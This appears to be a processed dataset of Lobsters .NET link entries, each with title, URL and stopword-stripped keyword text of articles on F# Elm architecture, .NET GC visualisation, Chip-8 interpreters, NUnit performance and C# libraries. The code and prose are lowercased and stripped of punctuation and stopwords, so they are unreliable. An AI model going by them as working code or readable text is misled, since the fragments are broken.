propertyinitialiserpropertyname value var valuespropertyisspecified propertyinitialisersany propertyinitialiser propertyinitialiserpropertyname value valuepropertyisspecified valuespropertyisspecified return var objectcreation objectcreationexpressionsyntax contextnodeparent var objectcreationtypeinfo contextsemanticmodelgettypeinfo objectcreation objectcreationtypeinfotype ierrortypesymbol objectcreationtypeinfotypecontainingassemblyidentityname bridgereact objectcreationtypeinfotypename selectattributes return multiplepropertyvalue true valuepropertyisspecified contextreportdiagnostic diagnosticcreate multiplewithvaluerule contextnodegetlocation else multiplepropertyvalue false valuespropertyisspecified contextreportdiagnostic diagnosticcreate nomultiplewithvaluesrule contextnodegetlocation private static localizablestring getlocalizablestring string nameoflocalizableresource return new localizableresourcestring nameoflocalizableresource resourcesresourcemanager typeof resource posted
487,Lobsters,dotnet,"C#, F#, .NET programming",F# Implementation of The Elm Architecture,http://anthonylloyd.github.io/blog/2016/06/20/fsharp-elm-part1,f implementation elm architecture,f implementation elm architecture elm architecture post elm architecture model msg update view elm architecture,f implementation elm architecture jun prototype implementation elm architecture f post cover ui implementation follow post cover using wpf xamarin elm architecture simple pattern creating functional uis due modularity composability make ui code easier write understand test reuse ui implementation complete representation native ui minimal list ui update calculated current future ui used update native ui little interaction possible mean native ui render faster responsive also mean multiple native ui platform targeted application code ui event implemented using simple function mapped combined top level message event primitive ui component level event implemented using double ref native ui event hooked event redirected quickly ui change without potential memory leak arises single ref implementation message event used primitive ui component type msg event msg unit ref ref layout section ui component type layout horizontal vertical primitive ui component type ui text string input string string event button string unit event div layout ui list ui component update event redirection type uiupdate insertui int list ui updateui int list ui replaceui int list ui removeui int list eventui unit unit ui component including message event type msg ui ui ui mutable event msg unit ui application type app msg model model model update msg model model view model msg ui native ui interface type inativeui abstract member send uiupdate list unit ui rendering made even faster using memoize function larger view store weak reference model view output make view diff function quicker remove unnecessary ui update compilationrepresentation compilationrepresentationflagsmodulesuffix module ui memoize view generation model object reference let memoize model msg model struct msg struct let conditionalweaktable model msg ui fun view model match dtrygetvalue model true ui ui false let ui view model dadd model ui ui return text display ui component let text text uitext text eventignore return text input ui component let input text let ev ref ignore ref let ui uiinput text ev eventignore let raise uievent ev raise ui return button ui component let button text msg let ev ref ignore ref let ui uibutton text ev eventignore ev fun uievent msg ui return section ui component given layout name div come html represents division section ui let div layout list let ui uidiv layout listmap fun ui uiui list eventignore let raise uievent listiter fun ievent raise list ui return new ui component mapping message event using given function let rec map f ui let uiuiui eventignore let raise e f e uievent raise return list ui update two ui component let diff let inline update fun let ev ev ev let rec diff path index diffs match languageprimitivesphysicalequality diffs text text diffs else updateui path diffs button button eventui update diffs else eventui update updateui path diffs input input eventui update diffs else eventui update updateui path diffs button button input input updateui path diffs div div replaceui path diffs div div diffs div div l listfold fun diffs ui insertui path ui diffs index diffs l snd div l div listfold fun diffs removeui path diffs index diffs l snd div l div languageprimitivesphysicalequality diff div l div l path diffs div l div languageprimitivesphysicalequality diff div l div l path insertui index path diffs div l div languageprimitivesphysicalequality diff div l div l path removeui index path diffs div l div diff index path diffs diff div l div l path replaceui path diffs diff return ui application ui model update view let app model update view modelmodel updateupdate viewview run ui application given native ui let run nativeui inativeui app let rec handle model ui msg let newmodel appupdate msg model let newui appview newmodel newuievent handle newmodel newui let diff diff ui newui listiter function eventui f f diff nativeuisend diff let ui appview appmodel uievent handle appmodel ui nativeuisend insertui uiui ui application pattern four main part model state application msg update message update function update state view function view state ui module counter type model int let init model type msg increment decrement let update msg model match msg increment decrement let view model uidiv horizontal uibutton increment uibutton decrement uitext string model let app uiapp init update view module counterpair type model top countermodel bottom countermodel let init top bottom topcounterinit top bottomcounterinit bottom type msg reset top countermsg bottom countermsg let update msg model match msg reset init top msg model topcounterupdate msg modeltop bottom msg model bottomcounterupdate msg modelbottom let view model uidiv vertical counterview modeltop uimap top counterview modelbottom uimap bottom let app top bottom uiapp init top bottom update view module counterlist type model counter countermodel list let init counter type msg insert remove modify int countermsg let update msg model match msg insert model counterscounterinit modelcounters remove model counterslisttail modelcounters modify msg model counterslistmapat counterupdate msg modelcounters let view model uibutton add insert uibutton remove remove listmapi fun c counterview c uimap fun v modify v modelcounters uidiv vertical let app uiapp init update view elm architecture pattern promising produce type safe uis highly composable performance great even large uis time able target multiple ui framework updated namespace system namespace systemruntime namespace systemruntimecompilerservices multiple itemsmodule listfrom microsoftfsharpcollections type list head tail list interface ireadonlylist interface ireadonlycollection interface ienumerable interface ienumerable member getslice startindex int option endindex int option list member head member isempty bool member item index int get member length int member tail list val remove n int l list list list val n int val l list val pop int b list b list b list b list val l b list val p b list val x b val x b list val add p list l list list val p list val x val x list val mapat int mapping list list list val int val mapping multiple itemsval list list type list list val removed list val tail list val head list list val tail list list list multiple itemsmodule eventfrom microsoftfsharpcontrol type msg event msg unit ref ref message event used primitive ui component type event delegate args requires delegate delegate delegate new unit event delegate args member trigger sender obj args args unit member publish ievent delegate args new unit event delegate args type unit unit multiple itemsval ref value ref type ref ref type layout horizontal vertical layout section ui component union case layouthorizontal layout union case layoutvertical layout type ui text string input string string event button string unit event div layout ui list primitive ui component union case uitext string ui multiple itemsval string value string type string systemstring union case uiinput string string event ui union case uibutton string unit event ui union case uidiv layout ui list ui type list list type uiupdate insertui int list ui updateui int list ui replaceui int list ui removeui int list eventui unit unit ui component update event redirection union case uiupdateinsertui int list ui uiupdate multiple itemsval int value int requires member opexplicit type int type int measure int union case uiupdateupdateui int list ui uiupdate union case uiupdatereplaceui int list ui uiupdate union case uiupdateremoveui int list uiupdate union case uiupdateeventui unit unit uiupdate multiple itemstype ui text string input string string event button string unit event div layout ui list primitive ui component type msg ui ui ui mutable event msg unit ui component including message event multiple itemsuiui ui type ui text string input string string event button string unit event div layout ui list primitive ui component type msg ui ui ui mutable event msg unit ui component including message event multiple itemsuievent msg unit module eventfrom microsoftfsharpcontrol type msg event msg unit ref ref message event used primitive ui component type event delegate args requires delegate delegate delegate new unit event delegate args member trigger sender obj args args unit member publish ievent delegate args new unit event delegate args type app msg model model model update msg model model view model msg ui ui application appmodel model appupdate msg model model appview model msg ui type inativeui interface abstract member send uiupdate list unit end native ui interface multiple itemstype compilationrepresentationattribute inherit attribute new flag compilationrepresentationflags compilationrepresentationattribute member flag compilationrepresentationflags new flag compilationrepresentationflags compilationrepresentationattribute type compilationrepresentationflags none static instance modulesuffix usenullastruevalue event compilationrepresentationflagsmodulesuffix compilationrepresentationflags val memoize model msg requires reference type reference type model msg ui model msg ui requires reference type reference type memoize view generation model object reference val value bool bool val conditionalweaktable model msg ui requires reference type reference type multiple itemstype conditionalweaktable tkey tvalue requires reference type reference type new unit conditionalweaktable tkey tvalue member add key tkey value tvalue unit member getorcreatevalue key tkey tvalue member getvalue key tkey createvaluecallback createvaluecallback tkey tvalue tvalue member remove key tkey bool member trygetvalue key tkey value tvalue bool nested type createvaluecallback conditionalweaktable conditionalweaktable tkey tvalue val view model msg ui requires reference type reference type val model model requires reference type conditionalweaktabletrygetvalue key model value byref msg ui bool val ui msg ui requires reference type conditionalweaktableadd key model value msg ui unit val text text string ui return text display ui component val text string val ignore value unit val input text string string ui return text input ui component val ev string unit ref ref val ui string ui val raise string unit val string uievent string unit val button text string msg ui return button ui component val msg val ev unit unit ref ref val ui ui uievent unit val div layout layout list ui list ui return section ui component given layout name div come html represents division section ui val layout layout multiple itemsval list ui list type list list multiple itemsmodule listfrom main module listfrom microsoftfsharpcollections type list head tail list interface ireadonlylist interface ireadonlycollection interface ienumerable interface ienumerable member getslice startindex int option endindex int option list member head member isempty bool member item index int get member length int member tail list val map mapping u list list u list uiui ui val raise unit val val iter action unit list list unit val ui val map f b ui ui b ui return new ui component mapping message event using given function val f b val b ui val e uievent b unit val diff ui b ui uiupdate list return list ui update two ui component val ui val update c ref ref c ref ref unit unit val c ref ref val c ref ref val ev c ref val diff ui ui int list int uiupdate list uiupdate list val ui val ui val path int list val index int val diffs uiupdate list module languageprimitivesfrom microsoftfsharpcore val physicalequality bool requires reference type val string val string val unit event val unit event val string event val string event val layout val layout val l ui list val fold folder state state state state list list state val ui ui val snd tuple val l layout val ui val ui list val ui val ui list val ui val app model update b view b ui app b return ui application ui model update view val model val update b val view b ui val run nativeui inativeui app app b unit run ui application given native ui val nativeui inativeui val app app b val handle b ui unit val model b val newmodel b appupdate b b val newui ui appview b ui val diff uiupdate list val f unit unit abstract member inativeuisend uiupdate list unit appmodel b type model int val init model model val model type msg increment decrement union case msgincrement msg union case msgdecrement msg val update msg msg model int int val msg msg val model int val view model model msg ui val model model multiple itemsmodule uifrom main type ui text string input string string event button string unit event div layout ui list primitive ui component type msg ui ui ui mutable event msg unit ui component including message event val app model app msg model type model top model bottom model modeltop countermodel module counterfrom main modelbottom countermodel val init top countermodel bottom countermodel model val top countermodel val bottom countermodel val init countermodel countermodel type msg reset top msg bottom msg union case msgreset msg union case msgtop countermsg msg union case msgbottom countermsg msg val update msg msg model model model val msg countermsg val update msg countermsg model int int val view model countermodel countermsg ui val app top countermodel bottom countermodel app msg model module counterlistfrom main type model counter model list modelcounters countermodel list val init model type msg insert remove modify int msg union case msginsert msg union case msgremove msg union case msgmodify int countermsg msg val mapi mapping int u list list u list val c countermodel val v countermsg val app app msg model
488,Lobsters,dotnet,"C#, F#, .NET programming",Visualising the .NET Garbage Collector,http://www.mattwarren.org/2016/06/20/Visualising-the-dotNET-Garbage-Collector/,visualising net garbage collector,visualising net garbage collector part julia evans gzip poetry awesome direct link gif full source available capturing gc event net traceevent library etw event many gc pause background foregroundnonconcurrent background concurrent background user notice net blog background foreground blocking gc flow foreground excellent blog post maoni stephen suspension done actual gc done resumption done background gc flow background maoni blog post background gc start done initial suspension done background gc suspension suspension foreground gc done foreground gc done resumption foreground gc done background gc end msdn page gc trickier calculate actual time age ascent gc pause ben adam age ascent hacker news,visualising net garbage collector jun word part ongoing attempt learn reallife garbage collector gc work see part inspired julia evans excellent post gzip poetry awesome spent time writing tool enable live visualisation net gc action output tool shown click playstop direct link gif full source available want take look capturing gc event net fortunately straightforward way capture raw gc related event using excellent traceevent library provides wrapper underlying etw event net gc output simple writing code like sessionsourceclrgcallocationtick allocationdata processidsusedinrunscontains allocationdataprocessid false return totalbytesallocated allocationdataallocationamount consolewrite wiring callback time gcallocationtick event fired event available include gcstart gcend gcsuspendeestart gcrestarteestart many well outputting visualisation raw event also aggregated summary produced memory allocation byte currently allocated byte allocated total gc collection total excluding bg generation generation generation generation bg time gc m m avg time test m spent gc total gc pause time m largest gc pause m gc pause visualisation summary information relatively easy calculate however timing gc pause always straightforward since net server gc main mode available new background gc mode existing foregroundnonconcurrent one net workstation gc background gc mode since net concurrent mode main benefit background mode reduces gc pause specifically reduces time gc suspend user thread running inside clr problem stoptheworld pause also known time application continue whatever pause last long enough user notice see image courtesy net blog newer background mode net time userthreads suspended much smaller dark blue arrow need suspended part gc process entire duration foreground blocking gc flow calculating pause foreground gc mean gen gc full blocking gc relatively straightforward using info excellent blog post maoni stephen main developer net gc suspension done actual gc done resumption done pause difference timestamp event background gc flow however background gc gen complicated maoni blog post background gc start done initial suspension done background gc suspension suspension foreground gc done foreground gc done resumption foreground gc done background gc end bit easier understand step using annotated version image msdn page gc number along bottom correspond step caveat make trickier calculate actual time course could one foreground gc could line one line may also decide ephemeral gc start bgc bgc meant might also see ephemeral gc line difference normal ephemeral gc see suspension resumption event already suspendedresumed bgc purpose age ascent gc pause finally want dramatic way visualising stop world accurately stop universe gc pause take look video gc pause start around second credit ben adam age ascent video discus post hacker news
489,Lobsters,dotnet,"C#, F#, .NET programming",Modern Dependency Injection,http://deliberate-software.com/modern-di/,modern dependency injection,unnecessary boilerplate unit test mocking mock unit test polymorphism check simplemock,dependency injection greatly simplified retaining power unnecessary boilerplate injection interface constructor common way replace dependency unittest mocking unfortunately extremely verbose pattern look much boilerplate needed mock call datetimenow public interface icurrenttime datetime getcurrenttime public class currenttime icurrenttime public datetime getcurrenttime return datetimenow public class formatter private readonly icurrenttime currenttime public formatter new currenttime public formatter icurrenttime currenttime thiscurrenttime currenttime public string format string input return stringformat currenttimegetcurrenttime tostring input learned mock way java lambda time pattern invented java c lambda existing di pattern improved unit test mocking thanks power lambda previously highlighted line removed public class formatter internal func currenttime datetimenow public string format string input return stringformat currenttime tostring input much better code easier read understand mock unit test polymorphism still need replace function another polymorphic dispatch use constructor injection lambda forewarned probably need much le think public class formatter internal func currenttime public formatter datetimenow public formatter func currenttime thiscurrenttime currenttime public string format string input return stringformat currenttime tostring input heavily invested unittesting might find need little actual interface polymorphism see really use interface polymorphism find interface codebase single concrete class production interface single concrete class testonly boilerplate safely replaced lambda example check simplemock
490,Lobsters,dotnet,"C#, F#, .NET programming",DaChip8JS - My C# Chip-8 Interpreter running in the browser using Bridge.NET,http://blog.dantup.com/2016/06/dachip8js-my-csharp-chip8-interpreter-running-in-the-browser/,c interpreter running browser using bridgenet,blogged building c interpreter bridgenet main chip implementation c version live demo even work chrome android pack video code change c key touch mapping keycode enum game loop change rom loading rendering change sound change touch support github,yesterday blogged building c interpreter recommend reading post one change detailed make sense idea original code written work pretty well running desktop sooo browser bust problem browser javascript know lot love luckily many option compiling language javascript one happen using recently work bridgenet thought fun run code see involved making run browser turned much le effort expected main chip implementation identical code c version live demo go running browser work chrome edge ie arraybuffer support xmlhttprequest fetch rom possibly even work chrome android touch ymmv rom loaded breakout brix hack david winter pack use cursor key move paddle desktop tap leftright half gamescreen mobile device click play video case demo work browser little video taken well complete internet suck much upload another one video code change obviously since rendering web different rendering winforms make change also work c bridge change external class hook call rendering buffer screen playing beep keep platformagnostic summary change make c currently bridgenet support c make couple change compile expressionbodied method become normal method c void addxtoi opcodedata data v datax c void addxtoi opcodedata data v datax string interpolation replaced stringformat call c debugwriteline drawing datan line sprite startx starty c debugwriteline stringformat drawing line sprite datan startx starty key touch mapping tweak key mapping previously used net framework key enum keycode enum contains key required added cursor key make demo rom better missing desktop version game loop change c version game loop hooked idle event winform used timer tell time call tick bridge version turned much simpler using setinterval static void startgameloop windowsetinterval targetelapsedtime windowsetinterval actually turned slightly complicated setinterval minimum resolution tweak slightly realised game loop running fast expected meant slower game game account run speed minimum resolution http developermozillaorgendomwindowsettimeout minimumdelayandtimeoutnesting static readonly int minimumsetintervalresolution static void startgameloop windowsetinterval tick minimumsetintervalresolution windowsetinterval static void tick var numtickstoexecute minimumsetintervalresolution targetelapsedtime var numtickstoexecute rom loading c version used filereadallbytes read rom disk obviously browser used xmlhttprequest fetch rom refactor code little allow starting game completed c version loaded synchronously ready public static void onready kick async loading rom beginloadrom rom static void beginloadrom string rom var req new xmlhttprequest reqresponsetype xmlhttprequestresponsetypearraybuffer reqopen get rom reqonload e endloadrom getresponseasbytearray req reqsend convert response byte existing c expects static byte getresponseasbytearray xmlhttprequest req return new reqresponse arraybuffer byte loading rom valid begin game loop static void endloadrom byte data data startgameloop rendering change constructor class take action bool get called whenever screen need rendered made easy change rendering code without making change used canvas render canvas id screen width height style minwidth minheight canvas note widthheight canvas relate coordinate used drawing actual size document setting make canvas ten time bigger resolution bit googling see fastest way render pixel canvas found solution involves creating imagedata pixel rendering location set canvas rendering screen documentgetelementbyid htmlcanvaselement screen screencontext screengetcontext lightpixel screencontextcreateimagedata lightpixeldata set green part lightpixeldata alpha static void draw bool buffer var width buffergetlength var height buffergetlength performance draw lit pixel need clear screen first screencontextclearrect width height render lit pixel var x x width x var height buffer x screencontextputimagedata lightpixel x sound change winforms version used consolebeep drawing pas action constructor action int time withthe int duration simplest way play beep j seemed audio element dataurl beep control duration figured work fine set audio http beep new htmlaudioelement data audiowav uqraaaawm trim big long string static void beep int millisecond beepplay unfortunately came across issue testing mobile play sound initiated user workaround made sound play tap start emulator touch support since large portion traffic blog come mobile thought embedded demo would pretty cool figured ensure work added touch handler canvas emulated pressing cursor key based side canvas touched set touch event canvas play mobile screenontouchstart settouchdown screenontouchend settouchup static void settouchdown touchevent htmlcanvaselement e etouches clientx keymapping keycodeleftcursor else keymapping keycoderightcursor epreventdefault static void settouchup touchevent htmlcanvaselement e keymapping keycodeleftcursor keymapping keycoderightcursor epreventdefault pretty much source code project found github
491,Lobsters,dotnet,"C#, F#, .NET programming",Building a Chip-8 Interpreter in C#,http://blog.dantup.com/2016/06/building-a-chip-8-interpreter-in-csharp/,building interpreter c,edit click see live playable demo ferris make emulator dane github also github class pack great table wikipedia github code github edit click see live playable demo,edit using bridgenet interpreter run browser click see live playable demo week ago watching episode ferris make emulator jake taylor livestreaming building emulator rust decided might fun project try build since never built emulator knowledge assembly fairly weak thought ne would good choice although want learn new language thought start c understand actually make emulator build something like rust current code dane github cut long story short stuck rendering taking little break thought might wiser try something simpler like maybe coming back ne fresher pair eye make thing easier new project also github working seems run rom tested fine work newbie want give shot code bit messy learning job main implementation chip pretty clean think video action video physical device like ne building really interpreter vm multiple hardware platform support gamesapps need rewritten different hardware unfortunately seem defined clock speed chip game written adapt game run faster faster chip artificially run slower hardware today much faster controlling rate call tick implemented chip class c register contained within expose two method tick controlled externally tick intended called clock speed considering somewhere need called time per second two register delay sound must decrement rate list field class constant screen size const int screenwidth screenheight buffer containing bool pixel screen monochrome bool buffer new bool screenwidth screenheight action chip invoke draw called inside beep whenever need beep passed constuctor since generally implemented platformspecific way action bool draw action int beep register referred v store byte thing file use hex refer thing v v last register v f also used special purpose carry collision flag byte v new byte supposed two timer sound delay easiest way implement beep consolebeep frequency duration rather sound timer count immediately start playing given duration might perfect ca nt cancel inprogress sound suspect reality work game byte delay address register referred used store memory address rendering sprite ushort program counter currently executing instruction also start location first byte used interpreter use store thing like builtin font data ushort pc stack used store program counter location jumping subroutine use array store address single byte index whenever jumping subroutine push program counter pc stack stack sp increment sp stack pointer need return decrement sp read address return stack sp byte sp ushort stack new ushort original system addressable memory byte ram new byte enable fast lookup function execute opcode use dictionary normally use first nibble bit twobyte instruction decide however bunch random instruction lumped nibble additional dictionary look based second byte dictionary byte action opcodedata opcodes dictionary byte action opcodedata opcodesmisc one instruction generate random number need random rnd new random also need keep track key currently held keyboard much like numeric pad af around edge c e b f store hashset allow easy checking whether key hashset byte pressedkeys new hashset byte building testing used rom pack far tell game written hobbyist freely distributableusable loading rom simply read byte file write ram starting explained public void loadprogram byte data arraycopy data ram datalength way opcodes interpreted generally based first nibble bit great table wikipedia duplicate example jump address nnn skip next instruction vx equal vy see n x instruction placeholder value f bit matched placeholder value also fall pattern easily assign name part instruction x second nibble third nibble n final fourth nibble nn second byte nnn last three nibble make opcode method signature wrapped data struct every opcode instruction function take opcodedata look like struct opcodedata public ushort opcode public ushort nnn public byte nn x n know opcodes laid build dictionary based first nibble case misc instruction second byte opcodes new dictionary byte action opcodedata clearorreturn two instruction starting nibble nt seem worth dictionary jump callsubroutine skipifxequal skipifxnotequal skipifxequaly setx addx arithmetic skipifxnotequaly seti jumpwithoffset rnd drawsprite skiponkey misc lookup second dictionary opcodesmisc new dictionary byte action opcodedata setxtodelay waitforkey setdelay setsound addxtoi setiforchar binarycodeddecimal savex loadx next need implement tick function read twobyte opcode ram location program counter pc point look instruction using first nibble implementing found instruction misc section care skipped rather crashing public void tick read two byte opcode bigendian mean significant byte come first shift byte left bitwiseor next byte get full value var opcode ushort ram pc ram pc write pc opcode read debugging debugwriteline pc tostring opcodetostring split data possible format instruction might need http opcodetable var op new opcodedata use bitwiseand mask extract specific nibble opcode opcode nnn ushort opcode nn byte opcode n byte opcode x byte opcode nt use lower nibble bitshift right get raw value byte opcode eg want loop opcode using first nibble execute opcodes byte opcode op misc dictionary full random stuff void misc opcodedata data opcodesmisccontainskey datann opcodesmisc datann data ok function tick decode opcode call correct function next need implement function go blog cover first five code rest find github first instruction first nibble actually two completely different instruction one clear screen one return subroutine point another dictionary two use simple summary handle either clear screen return subroutine summary void clearorreturn opcodedata data datann screen buffer array bools set false instructed clear screen var x x screenwidth x var screenheight buffer x false otherwise returning subroutine need pop address stack set program counter cover poppush implementation else datann pc pop two simple jump instruction one jump directly address lower three nibble nnn add value first register v summary jump location nnn subroutine old pc pushed stack summary void jump opcodedata data pc datannn summary jump location nnn v subroutine old pc pushed stack summary void jumpwithoffset opcodedata data pc ushort datannn v third jump instruction go subroutine need able return back finish executing end return instruction covered order preserve return address push program counter pc onto stack jumping summary jump subroutine nnn unlike jump push previous pc stack allow return summary void callsubroutine opcodedata data push pc pc datannn next opcode code one skip next instruction v x equal nn x nn taken opcodedata decoded code branch based condition eg next instruction might go subroutine summary skip next instruction two byte v x nn summary void skipifxequal opcodedata data v datax datann pc something much easier implement expected stack hold address implementation pop push incredibly simple summary push value onto stack incrementing sp summary void push ushort value stack sp value summary retrieves value stack decrementing sp summary ushort pop stack sp instruction implemented need implement decrement delay counter cause redraw draw function action byte supplied constructor consuming code get screen public void delay delay draw buffer finally need something tick chip draw screen used simple winforms app picturebox call tick appropriate time implement draw beep action passed chip like void draw bool buffer var x x screenwidth x var screenheight screensetpixel x buffer x colordarkgreen colorblack void beep int millisecond consolebeep millisecond pretty much addition instruction thing cover builtin font sprite character find code github need download rom mention readme run thinking building emulator unsure start great first project pretty much everything done one ne emulator started exception rendering useful practice edit using bridgenet interpreter run browser click see live playable demo
492,Lobsters,dotnet,"C#, F#, .NET programming",Tracking down a performance hit,https://codeblog.jonskeet.uk/2016/06/09/tracking-down-a-performance-hit/,tracking performance hit,noda time benchmarkdotnet step check really problem step find problematic test step find bottleneck step remove noda time step dig nunit step remove nunit github issue step file coreclr issue step file nunit issue issue step blog conclusion like,following progress net core lot interest trying make noda time master branch keep aim noda time eventually ship apology compatible net core start expected able support appears much missing look like actual target particularly looking forward able run noda time benchmark using benchmarkdotnet compare net core linux code window order make fair comparison two intel nucs sporting memory happens got far running benchmark net core able run unit test linux window using tfm recently pretty shocked see depending test ran test time slower linux window using case post brief log track problem step check really problem thought actually matter running test release configuration something similar verification ran test several time specifying c release command line use release build nodatimetestdll nodatimedll running debugger definitely issue done shell additionally ran test two way firstly running whole test suite secondly running wherecat slow avoid test got known really pretty slow typically test compare answer bcl give answer noda time give across whole history particular calendar system time zone pleased report bottleneck test almost always bcl help speed slow test much slower linux might pointed problem bcl calendar time zone code ratio vary enough problem circumstance worth looking step find problematic test strong expectation one way another whether would come general problem jit linux whether might one piece code causing problem test others knowing significant difference handling culture time zone code linux window implementation wanted find test used bcl little possible also slow enough difference timing pronounced easily explicable problem measuring small amount time fortunately nunit produce testresultxml file easy parse linq xml could easily transform result window linux list test ordered duration descending spot right kind test found answer umalqurayearmonthdaycalculatortestgetyearmonthdaydayssinceepoch effectively test um al qura calendar self consistency iterating every day supported time period checking convert day since unix epoch expected year month day particular test rely window implementation calendar use time zone culture anything similar nicely selfcontained test took linux window possible figure debug build repeated test using release build confirmed difference still similar step find bottleneck point aim try remove bit test time difference went away expected find something quite obscure causing difference something like different cpu cache behaviour knew next step would isolate problem small piece code expected would involve reasonable chunk noda time least type really lucky first obvious call remove made big difference equality assertion assertion usually first thing remove test everything else typically build something use making call without either using result later asserting something result presumably interested side effect soon removed call assertareequal expected actual execution time dropped massively linux hardly moved window effectively par wondered whether problem fact asserting equality custom structs tried replacing real assertion assertion equality string integer significant difference showed discrepancy window linux step remove noda time identified assertion cause problem trivial start new test project dependency noda time consisting test like test public void foo int var x var assertareequal x still demonstrated problem consistently allowed simpler experimentation different assertion step dig nunit life glad lot implementation detail framework exposed publicly able try lot different bit asserting equality order pin problem thing tried assertareequal x slow assertthat x isequalto slow constructing nunitequalitycomparer fast calling nunitequalitycomparerareequal fast construction occurred loop comparison loop calling isequalto slow last bullet two bullet surprising tipped nunitequalitycomparer us reflection could easily differ performance window checking equality seemed fast constructing constraint slow poking around nunit source code thank goodness open source obvious assertareequal x assertthat isequalto x behave way former call latter isequalto slow linux method simple creates instance equalconstraint equalconstraint constructor body proved equalconstraint causing problem deriving constraint noop implementation sure enough constructing slow leaf constructor constraint abstract base class protected constraint params object args argument args displayname thisgettype name displaynameendswith displaynameendswith displayname displaynamesubstring displaynamelength displaynameendswith constraint displayname displaynamesubstring displaynamelength look innocuous maybe calling gettype name expensive linux test nope fast point beginning wonder whether ever get bottom let test public void endswith string text abcdefg int iteration textendswith sure enough fast window slow linux wow look like culprit step remove nunit point relatively plain sailing reproduce issue simple console app list code github issue time calling endswith get jit compiled million time rigorous benchmark world absolutely difference linux window hardware worried inaccuracy millisecond step file coreclr issue shown filed bug github like think pretty good bug report detail environment short complete console app ready copypastecompilerun result exactly kind thing put stack overflow question ask minimal complete example stack overflow mean anyway minute later stephen toub basically worked nub culture issue initially reproduce saw result window linux changing culture engb saw seeing confirmed opposite ran code set langenus problem went away stephen pulled matt elli gave detail going wrong behind scene step file nunit issue matt elli suggested filing issue nunit reason code culturesensitive specifying string comparison ordinal go even faster path using u culture displaynameendswith constraint becomes displaynameendswith constraint stringcomparisonordinal equivalent two call pointed issue also little bit odd worked every constraint constructor call course going give result every instance type every constraint constructor call becomes every assertion entire test run pretty performancecritical piece code unit test important term performance way production code anything add friction bad news hopefully nunit team apply simple improvement next release coreclr team attack tougher underlying problem time step blog open stack edit start typing following progress conclusion none step listed particularly tricky diagnosing problem often matter determination unwilling admit defeat cleverness denying certain art able find right seam split problem two admittedly hope useful start finish example diagnostic session look feel like one physical session course found bit time investigate course day would step either way smug satisfied like like loading related
493,Lobsters,dotnet,"C#, F#, .NET programming",dotnetConf 2016,https://channel9.msdn.com/,dotnetconf,,
494,Lobsters,dotnet,"C#, F#, .NET programming",OneOf - Discriminated unions for C#,http://10printhello.com/oneof-npotw-2-of-n/,oneof discriminated union c,discriminated union anyway enter oneof github us exception control flow similar library many library nuget,week package one project created working f discriminated union type discriminated union anyway du type data structure used hold single value one fixed set type eg type shape rectangle width float length float circle radius float prism width float float height float shape instance hold either rectange circle prism instance f use match statement write handler case map du single type let getshapeheight shape match shape rectangle height h h circle radius r r prism height h h almost bit like switch statement type long else else block key difference compiler enforces write handler case c created new type class square shape switch statement rendering continue compile f added new type du get compile error make code far maintainable go forward update method library project new return value consuming code elsewhere project forced explicitly handle rather falling back default implementation often runtime notimplementedexception dus match statement provide alternative adding abstract property base class way guarantee level compiler checking c codebase enter oneof installpackage oneof github using custom struct oneof tn list possible type generic argument get somewhat similar behaviour c instance type hold single value one type generic argument list oneof type implicitly cast value generic parameter type eg rectangle rect new rectangle oneof rectangle circle prism shape rect access value using asserttrue asserttrue rectangle mean work nicely return value public oneof product notfound findproduct int productid var product sessionproductssingleordefault p pid productid product null return new notfound return product matching use tout match func func fn method perform action eg oneof rectangle circle prism shape shapematch rect gfxdrawrect rectx recty rectwidth recheight circle gfxdrawcircle circlex circley circleradius prism map another value oneof rectangle circle prism shape var area shapematch rect rectwidth recheight circle mathpi circleradius prism add another generic argument list add another lambda match statement get compile us thing find useful typically mvc webapi controller action end typed actionresult object commonly return notfound errorresults happypath result value using oneof allows make explicit valid return type handy hoping generate documentation sdk api similarly use remove exception control flow creating oneof resulttype reducing overload want let caller pas several different type see code sample matching eg public void setbackground oneof string colorname color backgroundcolor color c backgroundcolormatch str csshelpergetcolorfromstring str name new color name col col windowbackgroundcolor c similar library one thought many library nuget accomplishing similar feat
495,Lobsters,dotnet,"C#, F#, .NET programming",Ionide and the State of F# Open Source Environment,https://www.youtube.com/watch?v=XMvSR-oRjzQ,ionide state f open source environment,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature ionide state f open source environment youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature ionide state f open source environment youtube
496,Lobsters,dotnet,"C#, F#, .NET programming",KoduStore a Minimal ORM for UWP Using LevelDB and BSON,https://github.com/maxpert/KoduStore,kodustore minimal orm uwp using leveldb bson,kodustore newtonsoft json leveldb uwp feature install http wwwnugetorgpackageskodustore quick tutorial opening collection finding saved document delete document finding document secondary index finding document within range finding document starting point limit roadmap,kodustore kodustore marries object leveldb uwp delightful way really basic document store support primary secondary index support solve problem right pcl uwp two dependency newtonsoft json leveldb uwp feature simple yet powerful api threadsafe allows multiple reader single writer cleaner abstraction document ultra lightweight line code detailed testcase coverage install kodustore available nuget package http wwwnugetorgpackageskodustore install simply installpackage kodustore install dependency leveldb uwp newtonsoft json quick tutorial simple define storage object plain c object like public class post primaryindex public long id get set secondaryindex public string author get set secondaryindex public int upvotes get set public string title get set public string body get set public datetime published get set public list comment comment get set opening collection save document must open collection put document collection var collection new collection post post collectionopen open post post item type collectionput new post id member finding saved document field marked secondaryindex primaryindex attribute used query document retrieve saved document collection call find find many flavour looking one post post collectionquery iid get query collection post id value delete document given item simply call delete item delete collection collectiondelete post deletes document postid finding document secondary index like expression iid use valid secondary index object collectionquery iauthor get zohaib finding document within range damn simple ilist post post collectionqueryrange iid get ilist post popularposts collectionqueryrange iupvotes get get call take two parameter starting key ending key passing reverse order iterate key revers order hence result would sorted reverse order finding document starting point limit basic yet powerful index stored increasing sorted order start picking item particular point upto limit end range post id ilist post post collectionqueryscan iid limit getall start scanning record id keep cursor moving forward direction limit fulfilled id record scan id result start first key scan done reverse direction well scanning maxvotecount backwards increasing sorted index upvotes ilist post collectionqueryscan iupvotes backwards limit getall maxvotecount scan item upvotes maxvotecount quite possible item maxvotecount like scan start first item heighest upvotes reverse direction roadmap association support manual filter iteration support detailed documentation demo apps
497,Lobsters,dotnet,"C#, F#, .NET programming","ASP.NET Core retires ""project.json,"" moves back to MSBuild",https://twitter.com/davidfowl/status/730219570783363073,aspnet core retires projectjson move back msbuild,,detected javascript disabled browser would like proceed legacy twitter yes
